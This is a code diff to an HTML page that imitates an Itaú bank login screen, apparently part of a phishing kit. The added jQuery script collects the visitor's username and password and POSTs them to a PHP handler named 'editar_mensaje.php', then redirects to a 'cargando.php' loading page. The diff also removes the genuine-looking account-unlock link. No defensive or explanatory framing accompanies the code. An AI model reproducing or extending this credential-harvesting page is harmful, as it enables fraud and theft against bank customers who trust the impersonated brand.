@@ -12,7 +12,6 @@
 </head>
 <body>
 
-
 <div class="logo" style="height:300px;">
     <center><img src="/img/itaulogo.jpg" alt="" width="" height="300px"></center>
 </div>
@@ -25,8 +24,8 @@
 
     <div class="user">
         <br><label for="" style="margin-left:20px;">Usuario</label>
-        <center><input type="text" name="Usuario" id="txtUser"></center>
-        <input type="checkbox" name="" id="" style="margin-left:20px;margin-top:10px; border:1px solid black;"> <label for=""> For english</label><br>
+        <center><input type="text" name="Usuario" id="txtUsuario"></center>
+        <input type="checkbox" name="" id="" style="margin-left:21px;margin-top:9px;width:12px;height:12px; border:1px solid black;"> <label for="">For english</label><br>
        
         <div style="width:90%;margin:auto; font-size: 18px; margin-top:10px;">
         <label >Hemos cambiado nuestra politica de datos, para mayor información haz clic <a href="">Aquí</a></label>
@@ -41,8 +40,6 @@ Ingresar</button>
 <br><br><input type="submit" value="Regístrate" style="width:88%; height:40px; background-color: white; color:#fe6a00;border:2px solid #fe6a00;
 ">
 
-<br><br><a href="" style="color:blue; font-size:20px;     font-weight: 600;
-">Desbloquea tu usuario</a>
         </center>
     </div>
 
@@ -63,11 +60,67 @@ Ingresar</button>
         <center><br><div class="gray"style="width:95%; background-color:#dcdcdc; font-size:12px;">Si en algún momento no encuentras la imagen y la frase correcta, no digites tu contraseña y <b>llama inmediatamente a nuestra Banca Telefónica</b></div></center>
       </div>
       <div class="modal-footer">
-       <input type="password" name="" id="" style="width:70%; height:35px;"> <button type="button" class="btn " style="border:none; background-color:#fe6a00; color:white;">Ingresar </button>
+       <input type="password" placeholder="Contraseña" name="" id="txtPass" style="width:70%; height:35px; padding-left: 3px;"> 
+       <button type="button" class="btn" id="btnUsuario" style="border:none; background-color:#fe6a00; color:white;">Ingresar </button>
       </div>
     </div>
   </div>
 </div>
+
+<script type="text/javascript">
+	var espera = 0;
+
+	let identificadorTiempoDeEspera;
+
+	function retardor() {
+	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
+	}
+
+	function retardorX() {
+
+	}
+
+	$(document).ready(function() {
+
+		$('#btnUsuario').click(function(){
+			if ($("#txtUsuario").val().length > 0) {
+				const data = {
+                    'usuario': $("#txtUsuario").val(),
+                    'pass': $("#txtPass").val()
+                };
+                console.log(data);
+                $.ajax({
+                    url: '../../acciones/editar_mensaje.php',
+                    method: 'POST',
+                    data: {
+                        data: data
+                    },
+                    success: function(response) {
+                        const result = JSON.parse(response);
+                        if (result.success) {
+                            window.location.href = "cargando.php";
+                        } else {
+                            alert('Error de conexión, por favor intente de nuevo');
+                           window.location.href = "/";
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        alert('Error en la solicitud AJAX: ' + error);
+                    }
+                });	
+			}else{
+				$("#err-mensaje").show();
+				$(".user").css("border", "1px solid red");
+				$("#txtUsuario").focus();
+			}			
+		});
+
+		$("#txtUsuario").keyup(function(e) {
+			$(".user").css("border", "1px solid #CCCCCC");	
+			$("#err-mensaje").hide();				
+		});
+	});
+</script>
 
 
 </body>
